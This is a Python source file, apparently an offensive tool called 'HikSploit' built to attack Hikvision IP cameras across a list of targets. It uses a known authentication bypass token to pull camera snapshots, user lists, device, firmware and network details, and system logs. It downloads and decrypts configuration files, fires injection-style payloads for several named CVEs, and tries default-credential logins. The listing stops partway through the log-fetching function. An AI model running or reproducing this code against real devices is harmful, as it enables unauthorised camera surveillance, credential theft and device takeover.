import requests
import os
import time
from datetime import datetime
import subprocess
import signal
import xml.etree.ElementTree as ET
import argparse
import webbrowser
import sys # Added for sys.stdout redirection

CONFIG = {
    "paths": {
        "snapshot": "/onvif-http/snapshot?auth=YWRtaW46MTEK",
        "device_info": "/System/deviceInfo?auth=YWRtaW46MTEK",
        "user_info": "/Security/users?auth=YWRtaW46MTEK",
        "config_file": "/System/configurationFile?auth=YWRtaW46MTEK",
        "cve_2017_7921_check": "/Security/userCheck",
        "cve_2022_28171_check": "/ISAPI/Security/userCheck",
        "firmware_version_ext": "/System/firmware?auth=YWRtaW46MTEK",
        "network_config_ext": "/ISAPI/System/Network/interfaces?auth=YWRtaW46MTEK",
        "system_logs_ext": "/ISAPI/System/logs?auth=YWRtaW46MTEK",
        "login_check": "/ISAPI/Security/userCheck"
    },
    "timeouts": {
        "default": 7,
        "snapshot_download": 15
    },
    "cve_payloads": {
        "2021_36260_headers": [
            {"User-Agent": "Mozilla/5.0"},
            {"X-Original-URL": "/Security/users"},
            {"X-Rewrite-URL": "/Security/users"}
        ],
        "2021_36260_post": [
            """<?xml version="1.0" encoding="UTF-8"?><userCheck><userName>admin</userName><password>admin</password></userCheck>""",
            """<?xml version="1.0" encoding="UTF-8"?><userCheck><userName>admin' OR '1'='1</userName><password>admin</password></userCheck>""",
            """<?xml version="1.0" encoding="UTF-8"?><userCheck><userName>admin"><password>admin</password></userCheck>"""
        ],
        "common_xml_post": [
            """<userCheck><userName>admin</userName><password>admin</password></userCheck>""",
            """<userCheck><userName>admin' OR '1'='1</userName><password>admin</password></userCheck>""",
            """<userCheck><userName>admin"><password>admin</password></userCheck>"""
        ]
    },
    "default_credentials": [
        {"username": "admin", "password": "12345"},
        {"username": "admin", "password": "admin"},
        {"username": "user", "password": "user"},
        {"username": "root", "password": "root"},
        {"username": "admin", "password": ""},
        {"username": "viewer", "password": "viewer"},
        {"username": "guest", "password": "guest"}
    ]
}

# Define paths for logs
log_directory = "logs"
os.makedirs(log_directory, exist_ok=True)

class Color:
    # ANSI color codes for console output
    RESET = "\033[0m"
    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"
    BRIGHT_MAGENTA = "\033[95m"
    BRIGHT_CYAN = "\033[96m"
    BRIGHT_WHITE = "\033[97m"

# Global flag to handle interrupt signals
interrupted = False

class TargetTimeout(Exception):
    """Custom exception for target scan timeouts."""
    pass

def print_banner():
    """Prints the ASCII art banner with the tool name 'HikSploit'."""
    banner = f"""
{Color.BRIGHT_BLUE}
============================================
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⠒⠒⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢟⣇⠤⠒⠂⠤⡀⠀⢰⠃⠀⠀⣀⠄⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠈⢆⢺⠀⠀⠀⠣⣀⣀⡼⢤⣶⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣸⡀⠀⢀⣴⣤⠀⡜⠘⢆⣠⠴⠋⣩⣴⡾⢟⣿⣿⣿⣿⣶⣾⣭⣝⡶⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣤⠀⢸⣿⠃⠀⠀⣠⡼⠣⣤⣿⣿⣛⠤⠛⣿⣿⡿⣻⣿⣟⡿⠿⣿⣘⣿⡀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣶⣶⣿⣿⣯⣶⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⢀⠀⠀⠀⠈⢺⣻⣄⠀⠻⣄⣀⣴⣋⢔⢪⡶⠛⠀⢑⣲⢶⣿⣿⠾⠛⢡⠁⠀⠰⢿⣿⣿⡽⡆⠀⠀⠀
⠀⠀⣠⣾⡿⠛⣿⡿⣿⣿⡯⠭⣍⣛⠷⣿⣧⢀⣶⡿⠲⡀⢀⣤⣪⠭⠭⣉⠑⠢⡀⠀⠉⠚⠭⣶⢶⡞⠁⢁⣴⢻⠀⠀⢰⠁⠀⠉⢆⠀⠀⣀⠤⣁⠀⢰⣁⡈⠙⢿⢻⠀⠀⠀
⠠⠊⠉⠉⠁⠈⢉⢼⣿⠏⣴⡄⠀⠈⠙⠯⣿⣷⠁⢀⣷⢡⡾⠋⠐⢀⡀⠈⢳⠀⢱⠀⠀⢠⣾⡟⡏⣇⣴⢟⣡⠼⡀⠀⠀⠁⠀⠀⡸⡰⠉⢀⣆⡤⢷⠼⡟⠋⠀⠸⡼⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡇⢸⠉⠉⠉⠐⣦⣄⠀⠀⠈⢿⣧⡸⣿⢸⠃⠀⠀⠘⠯⠤⠋⣴⡽⠀⠀⠎⠁⣸⣼⢟⠁⠈⠀⠀⡹⠢⢄⣀⡠⠔⠁⡇⠀⠀⡟⠻⡷⣦⠇⠀⠀⢠⢧⠠⣾⣦
⠀⠀⠀⠀⣀⠸⡂⠀⠉⠈⠀⠀⠈⠫⡄⠀⠀⠀⠘⢳⣽⣾⡆⠀⠀⠀⠀⠀⠱⠋⠀⠀⣠⣴⣾⣟⠁⣨⣖⠤⠤⣲⠥⣤⠤⣀⠀⠀⠀⠳⣄⠀⠑⢄⡀⠀⠀⢀⡴⢳⣣⠑⠛⠉
⠀⠀⠀⠈⠿⠛⠣⡀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠈⠿⣟⣦⡀⠑⠦⣴⣶⡾⣶⣿⠟⡏⣾⣿⣦⡤⠜⠀⣼⠁⢀⡿⠀⠀⠱⡄⠀⠀⠈⠓⠲⠤⠬⠟⠛⠉⠀⢺⡟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠢⠤⠤⠤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠶⠞⠒⠛⠉⠀⣾⣷⠋⣿⣿⠟⣁⡠⠎⠢⠤⠝⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠀⢻⡝⡟⣶⣦⣶⣦⣤⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡈⠢⣁⠀⠀⠈⠑⢄⡠⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⡠⠊⠉⠁⠂⢼⣵⠀⠀⠉⠁⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⡀⠀⠀⠀⠇⠀⠀⠀⠀⢾⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠈⠢⢄⣀⡴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
https://github.com/aresowl                                                                                                            
{Color.BRIGHT_MAGENTA}
============================================
              H I K S P L O I T
============================================
{Color.RESET}
"""
    print(banner)

def read_targets(file_path):
    """Reads IP:Port targets from a specified file."""
    try:
        with open(file_path, 'r') as file:
            targets = [line.strip() for line in file if line.strip()]
        return targets
    except FileNotFoundError:
        print(f"{Color.BRIGHT_RED}[-] Error: Target file '{file_path}' not found!{Color.RESET}")
        return []

def log_info(current_log_dir, message):
    """Logs a message to a file within the specified log directory."""
    os.makedirs(current_log_dir, exist_ok=True)
    log_file = os.path.join(current_log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(log_file, 'a') as file:
        file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def check_directory(ip_port, current_log_dir):
    """Checks if a specific directory (snapshot URL) is accessible on the target."""
    url = f"http://{ip_port}{CONFIG['paths']['snapshot']}"
    try:
        response = requests.head(url, timeout=CONFIG["timeouts"]["default"])
        if response.status_code == 200:
            message = f"[+] Directory is accessible: {url}"
            print(f"""{Color.BRIGHT_GREEN}
=======================================
============ New Target!! =============
======================================={Color.RESET}

{Color.BRIGHT_GREEN}{message}{Color.RESET}""")
            log_info(current_log_dir, message)
            return url
        else:
            message = f"[-] Directory not accessible or unexpected status code {response.status_code}: {url}"
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(current_log_dir, message)
    except requests.exceptions.Timeout:
        message = f"[-] Error checking directory: URL {ip_port} Timed out."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    except requests.exceptions.ConnectionError as e:
        message = f"[-] Connection error checking directory {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    except requests.exceptions.RequestException as e:
        message = f"[-] An unexpected request error occurred checking directory {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    return None

def fetch_xml_data(url, current_log_dir):
    """Fetches XML data from a given URL and attempts to parse it."""
    try:
        response = requests.get(url, timeout=CONFIG["timeouts"]["default"])
        if response.status_code == 200:
            try:
                return ET.fromstring(response.content)
            except ET.ParseError:
                message = f"[-] Error parsing XML data from {url}. Content might not be valid XML."
                print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
                log_info(current_log_dir, message)
                return None
        else:
            message = f"[-] Failed to retrieve XML data from {url}. Status: {response.status_code}"
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(current_log_dir, message)
    except requests.exceptions.Timeout:
        message = f"[-] Error fetching XML data: URL {url} Timed out."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    except requests.exceptions.ConnectionError as e:
        message = f"[-] Connection error fetching XML data {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    except requests.exceptions.RequestException as e:
        message = f"[-] An unexpected request error occurred fetching XML data {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    return None

def print_device_info(ip_port, current_log_dir):
    """Retrieves and prints device information from the target."""
    url = f"http://{ip_port}{CONFIG['paths']['device_info']}"
    xml_data = fetch_xml_data(url, current_log_dir)
    if xml_data is not None:
        message = f"\n{Color.BRIGHT_MAGENTA}[+] Device information for {ip_port}:{Color.RESET}"
        print(message)
        log_info(current_log_dir, message)
        found_info = False
        for child in xml_data:
            tag_name = child.tag.split('}')[-1]
            info = f"  {Color.BRIGHT_CYAN}- {tag_name.replace('device', 'Device ')}: {child.text}{Color.RESET}"
            print(info)
            log_info(current_log_dir, info)
            found_info = True
        if not found_info:
            message = f"[-] No device information found or XML structure different for {ip_port}."
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(current_log_dir, message)
    else:
        message = f"[-] Could not retrieve device information for {ip_port}."
        print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
        log_info(current_log_dir, message)

def print_user_info(ip_port, current_log_dir):
    """Retrieves and prints user information from the target."""
    url = f"http://{ip_port}{CONFIG['paths']['user_info']}"
    xml_data = fetch_xml_data(url, current_log_dir)
    if xml_data is not None:
        message = f"\n{Color.BRIGHT_MAGENTA}[+] Users and roles for {ip_port}:{Color.RESET}"
        print(message)
        log_info(current_log_dir, message)
        found_users = False
        for user in xml_data:
            username_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userName')
            user_level_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userLevel')

            if username_element is not None and user_level_element is not None:
                username = username_element.text
                user_level = user_level_element.text
                info = f"  {Color.BRIGHT_CYAN}- User: {username}, Level: {user_level}{Color.RESET}"
                print(info)
                log_info(current_log_dir, info)
                found_users = True
        if not found_users:
            message = f"[-] No user information found or XML structure different for {ip_port}."
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(current_log_dir, message)
    else:
        message = f"[-] Could not retrieve user information for {ip_port}."
        print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
        log_info(current_log_dir, message)

def download_single_snapshot(url, folder, fixed_filename=None):
    """Downloads a single snapshot from the camera.
       If fixed_filename is provided, it saves to that specific file name,
       useful for continuous updates in streaming mode.
       Returns True on success, False on failure.
    """
    try:
        response = requests.get(url, timeout=CONFIG["timeouts"]["snapshot_download"])
        if response.status_code == 200:
            if fixed_filename:
                filename = os.path.join(folder, fixed_filename)
            else:
                filename = os.path.join(folder, f"snapshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
            with open(filename, 'wb') as f:
                f.write(response.content)
            
            # Only print/log if not in streaming mode to avoid excessive console/log clutter
            if not fixed_filename:
                message = f"\n{Color.BRIGHT_GREEN}[+] Snapshot saved: {filename}{Color.RESET}"
                print(message)
                log_info(folder, message)
            return True # Indicate success
        else:
            message = f"[-] Failed to download snapshot from {url}. Status: {response.status_code}"
            # Only print/log if not in streaming mode to avoid excessive console/log clutter
            if not fixed_filename:
                print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
                log_info(folder, message)
            return False # Indicate failure
    except requests.exceptions.Timeout:
        message = f"[-] Error downloading snapshot: URL {url} Timed out."
        if not fixed_filename:
            print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
            log_info(folder, message)
        return False
    except requests.exceptions.ConnectionError as e:
        message = f"[-] Connection error downloading snapshot {url}: {e}."
        if not fixed_filename:
            print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
            log_info(folder, message)
        return False
    except requests.exceptions.RequestException as e:
        message = f"[-] An unexpected request error occurred downloading snapshot {url}: {e}."
        if not fixed_filename:
            print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
            log_info(folder, message)
        return False

def handle_signals(sig, frame):
    """Handles interrupt signals (Ctrl+\) to exit gracefully."""
    global interrupted
    if sig == signal.SIGQUIT:
        interrupted = True
        print(f"{Color.BRIGHT_YELLOW}\n[!] Ctrl+\\ detected. Exiting immediately...{Color.RESET}")
        os._exit(0)
    elif sig == signal.SIGALRM:
        print(f"{Color.BRIGHT_RED}\n[!] Target scan timed out! Moving to next target (if any).{Color.RESET}")
        raise TargetTimeout("Target scan exceeded allowed time.")

def fetch_and_decrypt_config(ip_port, folder):
    """Fetches and attempts to decrypt the configuration file."""
    url = f"http://{ip_port}{CONFIG['paths']['config_file']}"
    try:
        response = requests.get(url, timeout=CONFIG["timeouts"]["default"])
        if response.status_code == 200:
            config_file = os.path.join(folder, "encrypted_configfile.bin")
            with open(config_file, 'wb') as f:
                f.write(response.content)
            message = f"\n{Color.BRIGHT_GREEN}[+] Encrypted configuration file saved to: {config_file}{Color.RESET}"
            print(message)
            log_info(folder, message)
            try:
                process = subprocess.run(
                    ['python3', 'decrypt_configurationFile.py', config_file],
                    capture_output=True, text=True, check=False
                )
                if process.returncode == 0:
                    decrypted_message = f"{Color.BRIGHT_CYAN}[+] Decrypted Content from {config_file}:\n{process.stdout.strip()}{Color.RESET}"
                    print(decrypted_message)
                    log_info(folder, decrypted_message)
                else:
                    error_msg = f"{Color.BRIGHT_RED}[-] Error decrypting configuration file via script:\n{process.stderr.strip()}{Color.RESET}"
                    print(error_msg)
                    log_info(folder, error_msg)
            except FileNotFoundError:
                message = f"{Color.BRIGHT_RED}[-] Error: 'decrypt_configurationFile.py' not found. Make sure it's in the current directory.{Color.RESET}"
                print(message)
                log_info(folder, message)
            except Exception as e:
                message = f"{Color.BRIGHT_RED}[-] Unexpected error during decryption script execution: {e}{Color.RESET}"
                print(message)
                log_info(folder, message)
        else:
            message = f"[-] Failed to retrieve configuration file from {url}. Status: {response.status_code}"
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(folder, message)
    except requests.exceptions.Timeout:
        message = f"[-] Error fetching configuration file: URL {url} Timed out."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(folder, message)
    except requests.exceptions.ConnectionError as e:
        message = f"[-] Connection error fetching configuration file {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(folder, message)
    except requests.exceptions.RequestException as e:
        message = f"[-] An unexpected request error occurred fetching configuration file {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(folder, message)

def perform_get_request(url, headers, timeout_val, current_log_dir):
    """Performs a GET request and handles common exceptions."""
    try:
        response = requests.get(url, headers=headers, timeout=timeout_val)
        return response
    except requests.exceptions.Timeout:
        log_info(current_log_dir, f"Timeout on GET request to {url} with headers {headers}.")
        return None
    except requests.exceptions.ConnectionError as e:
        log_info(current_log_dir, f"Connection error on GET request to {url} with headers {headers}: {e}.")
        return None
    except requests.exceptions.RequestException as e:
        log_info(current_log_dir, f"An unexpected request error occurred on GET request to {url} with headers {headers}: {e}.")
        return None

def perform_post_request(url, headers, payload, timeout_val, current_log_dir):
    """Performs a POST request and handles common exceptions."""
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=timeout_val)
        return response
    except requests.exceptions.Timeout:
        log_info(current_log_dir, f"Timeout on POST request to {url} with payload {payload[:50]}....")
        return None
    except requests.exceptions.ConnectionError as e:
        log_info(current_log_dir, f"Connection error on POST request to {url} with payload {payload[:50]}...: {e}.")
        return None
    except requests.exceptions.RequestException as e:
        log_info(current_log_dir, f"An unexpected request error occurred on POST request to {url} with payload {payload[:50]}...: {e}.")
        return None

def check_cve_2021_36260(ip_port, current_log_dir):
    """Checks for CVE-2021-36260 vulnerability."""
    url = f"http://{ip_port}{CONFIG['paths']['user_info']}"
    vulnerable = False
    print(f"\n{Color.BRIGHT_BLUE}========= Checking CVE-2021-36260 for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Starting CVE-2021-36260 check for {ip_port}")

    for headers in CONFIG["cve_payloads"]["2021_36260_headers"]:
        response = perform_get_request(url, headers, CONFIG["timeouts"]["default"], current_log_dir)
        if response and response.status_code == 200:
            message_blue = f"{Color.BRIGHT_GREEN}[+] Target {ip_port} is vulnerable to CVE-2021-36260 (GET method, headers: {headers}).{Color.RESET}"
            print(message_blue)
            log_info(current_log_dir, message_blue)
            log_info(current_log_dir, f"Response status: {response.status_code}, Content (first 200 chars): {response.content.decode('utf-8', errors='ignore')[:200]}...")
            vulnerable = True
            break

    if not vulnerable:
        for payload in CONFIG["cve_payloads"]["2021_36260_post"]:
            response = perform_post_request(url, {}, payload, CONFIG["timeouts"]["default"], current_log_dir)
            if response and response.status_code == 200:
                message_blue = f"{Color.BRIGHT_GREEN}[+] Target {ip_port} is vulnerable to CVE-2021-36260 (POST method, payload: {payload[:50]}...).{Color.RESET}"
                print(message_blue)
                log_info(current_log_dir, message_blue)
                log_info(current_log_dir, f"Response status: {response.status_code}, Content (first 200 chars): {response.content.decode('utf-8', errors='ignore')[:200]}...")
                vulnerable = True
                break

    if not vulnerable:
        message_red = f"{Color.BRIGHT_MAGENTA}[-] Target {ip_port} does not appear vulnerable to CVE-2021-36260.{Color.RESET}"
        print(message_red)
        log_info(current_log_dir, message_red)
        if response:
            log_info(current_log_dir, f"Last response status: {response.status_code}, Content (first 200 chars): {response.content.decode('utf-8', errors='ignore')[:200]}...")
        else:
            log_info(current_log_dir, "No successful response received during CVE-2021-36260 check.")

def check_cve_2017_7921(ip_port, current_log_dir):
    """Checks for CVE-2017-7921 vulnerability."""
    url = f"http://{ip_port}{CONFIG['paths']['cve_2017_7921_check']}"
    vulnerable = False
    print(f"\n{Color.BRIGHT_BLUE}========= Checking CVE-2017-7921 for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Starting CVE-2017-7921 check for {ip_port}")

    for payload in CONFIG["cve_payloads"]["common_xml_post"]:
        response = perform_post_request(url, {"Content-Type": "application/xml"}, payload, CONFIG["timeouts"]["default"], current_log_dir)
        if response and response.status_code == 200 and b'<statusValue>1</statusValue>' in response.content:
            message = f"{Color.BRIGHT_GREEN}[+] Target {ip_port} is vulnerable to CVE-2017-7921 (payload: {payload[:50]}...).{Color.RESET}"
            print(message)
            log_info(current_log_dir, message)
            log_info(current_log_dir, f"Response status: {response.status_code}, Content (first 200 chars): {response.content.decode('utf-8', errors='ignore')[:200]}...")
            vulnerable = True
            break
    if not vulnerable:
        message_red = f"{Color.BRIGHT_MAGENTA}[-] Target {ip_port} does not appear vulnerable to CVE-2017-7921.{Color.RESET}"
        print(message_red)
        log_info(current_log_dir, message_red)
        if response:
            log_info(current_log_dir, f"Last response status: {response.status_code}, Content (first 200 chars): {response.content.decode('utf-8', errors='ignore')[:200]}...")
        else:
            log_info(current_log_dir, "No successful response received during CVE-2017-7921 check.")

def check_cve_2022_28171(ip_port, current_log_dir):
    """Checks for CVE-2022-28171 vulnerability."""
    url = f"http://{ip_port}{CONFIG['paths']['cve_2022_28171_check']}"
    vulnerable = False
    print(f"\n{Color.BRIGHT_BLUE}========= Checking CVE-2022-28171 for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Starting CVE-2022-28171 check for {ip_port}")

    for payload in CONFIG["cve_payloads"]["common_xml_post"]:
        response = perform_post_request(url, {"Content-Type": "application/xml"}, payload, CONFIG["timeouts"]["default"], current_log_dir)
        if response and response.status_code == 200 and b'<statusValue>1</statusValue>' in response.content:
            message = f"{Color.BRIGHT_GREEN}[+] Target {ip_port} is vulnerable to CVE-2022-28171 (payload: {payload[:50]}...).{Color.RESET}"
            print(message)
            log_info(current_log_dir, message)
            log_info(current_log_dir, f"Response status: {response.status_code}, Content (first 200 chars): {response.content.decode('utf-8', errors='ignore')[:200]}...")
            vulnerable = True
            break
    if not vulnerable:
        message_red = f"{Color.BRIGHT_MAGENTA}[-] Target {ip_port} does not appear vulnerable to CVE-2022-28171.{Color.RESET}"
        print(message_red)
        log_info(current_log_dir, message_red)
        if response:
            log_info(current_log_dir, f"Last response status: {response.status_code}, Content (first 200 chars): {response.content.decode('utf-8', errors='ignore')[:200]}...")
        else:
            log_info(current_log_dir, "No successful response received during CVE-2022-28171 check.")

def check_all_cves(ip_port, current_log_dir):
    """Runs all CVE checks for the given IP:Port."""
    check_cve_2021_36260(ip_port, current_log_dir)
    check_cve_2017_7921(ip_port, current_log_dir)
    check_cve_2022_28171(ip_port, current_log_dir)
    print(f"{Color.BRIGHT_GREEN}========= Done With CVE Checks for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Finished all CVE checks for {ip_port}")

def check_default_credentials(ip_port, current_log_dir):
    """Checks for common default credentials on the target."""
    url = f"http://{ip_port}{CONFIG['paths']['login_check']}"
    print(f"\n{Color.BRIGHT_BLUE}========= Checking Default Credentials for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Starting default credential check for {ip_port}")
    
    found_credentials = False
    for cred in CONFIG["default_credentials"]:
        username = cred["username"]
        password = cred["password"]
        payload = f"""<?xml version="1.0" encoding="UTF-8"?><userCheck><userName>{username}</userName><password>{password}</password></userCheck>"""
        
        response = perform_post_request(url, {"Content-Type": "application/xml"}, payload, CONFIG["timeouts"]["default"], current_log_dir)
        
        if response and response.status_code == 200 and b'<statusValue>1</statusValue>' in response.content:
            message = f"{Color.BRIGHT_GREEN}[+] Found valid default credentials: User='{username}', Pass='{password}' for {ip_port}.{Color.RESET}"
            print(message)
            log_info(current_log_dir, message)
            found_credentials = True
            # If you want to check all, remove 'break'
            # break
        else:
            log_info(current_log_dir, f"[-] Attempt failed for {username}:{password} on {ip_port}. Status: {response.status_code if response else 'N/A'}")

    if not found_credentials:
        message = f"{Color.BRIGHT_MAGENTA}[-] No common default credentials found for {ip_port}.{Color.RESET}"
        print(message)
        log_info(current_log_dir, message)

def get_firmware_details(ip_port, current_log_dir):
    """Fetches and prints firmware details from the target."""
    url = f"http://{ip_port}{CONFIG['paths']['firmware_version_ext']}"
    print(f"\n{Color.BRIGHT_BLUE}========= Fetching Firmware Details for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Attempting to fetch firmware details for {ip_port}")
    
    xml_data = fetch_xml_data(url, current_log_dir)
    if xml_data is not None:
        message = f"{Color.BRIGHT_MAGENTA}[+] Firmware details for {ip_port}:{Color.RESET}"
        print(message)
        log_info(current_log_dir, message)
        found_details = False
        for child in xml_data:
            tag_name = child.tag.split('}')[-1]
            info = f"  {Color.BRIGHT_CYAN}- {tag_name}: {child.text}{Color.RESET}"
            print(info)
            log_info(current_log_dir, info)
            found_details = True
        if not found_details:
            message = f"[-] No specific firmware details found or XML structure different for {ip_port}."
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(current_log_dir, message)
    else:
        message = f"[-] Could not retrieve firmware details for {ip_port}."
        print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
        log_info(current_log_dir, message)

def get_network_config(ip_port, current_log_dir):
    """Fetches and prints network configuration details from the target."""
    url = f"http://{ip_port}{CONFIG['paths']['network_config_ext']}"
    print(f"\n{Color.BRIGHT_BLUE}========= Fetching Network Configuration for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Attempting to fetch network configuration for {ip_port}")
    
    xml_data = fetch_xml_data(url, current_log_dir)
    if xml_data is not None:
        message = f"{Color.BRIGHT_MAGENTA}[+] Network configuration for {ip_port}:{Color.RESET}"
        print(message)
        log_info(current_log_dir, message)
        found_config = False
        for interface in xml_data.findall('.//{http://www.hikvision.com/ver10/XMLSchema}NetworkInterface'):
            ip_address = interface.find('.//{http://www.hikvision.com/ver10/XMLSchema}ipAddress')
            subnet_mask = interface.find('.//{http://www.hikvision.com/ver10/XMLSchema}subnetMask')
            gateway = interface.find('.//{http://www.hikvision.com/ver10/XMLSchema}DefaultGateway')
            
            if ip_address is not None:
                info = f"  {Color.BRIGHT_CYAN}- IP Address: {ip_address.text}{Color.RESET}"
                print(info)
                log_info(current_log_dir, info)
                found_config = True
            if subnet_mask is not None:
                info = f"  {Color.BRIGHT_CYAN}- Subnet Mask: {subnet_mask.text}{Color.RESET}"
                print(info)
                log_info(current_log_dir, info)
                found_config = True
            if gateway is not None:
                info = f"  {Color.BRIGHT_CYAN}- Default Gateway: {gateway.text}{Color.RESET}"
                print(info)
                log_info(current_log_dir, info)
                found_config = True
        
        if not found_config:
            message = f"[-] No specific network configuration details found or XML structure different for {ip_port}."
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(current_log_dir, message)
    else:
        message = f"[-] Could not retrieve network configuration for {ip_port}."
        print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
        log_info(current_log_dir, message)

def get_system_logs(ip_port, current_log_dir):
    """Fetches and saves system logs from the target."""
    url = f"http://{ip_port}{CONFIG['paths']['system_logs_ext']}"
    print(f"\n{Color.BRIGHT_BLUE}========= Fetching System Logs for {ip_port} ========={Color.RESET}")
    log_info(current_log_dir, f"Attempting to fetch system logs for {ip_port}")
    
    try:
        response = requests.get(url, timeout=CONFIG["timeouts"]["default"])
        if response.status_code == 200:
            log_content = response.content.decode('utf-8', errors='ignore')
            log_filename = os.path.join(current_log_dir, f"system_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
            with open(log_filename, 'w') as f:
                f.write(log_content)
            message = f"{Color.BRIGHT_GREEN}[+] System logs saved to: {log_filename}{Color.RESET}"
            print(message)
            log_info(current_log_dir, message)
        else:
            message = f"[-] Failed to retrieve system logs from {url}. Status: {response.status_code}"
            print(f"{Color.BRIGHT_MAGENTA}{message}{Color.RESET}")
            log_info(current_log_dir, message)
    except requests.exceptions.Timeout:
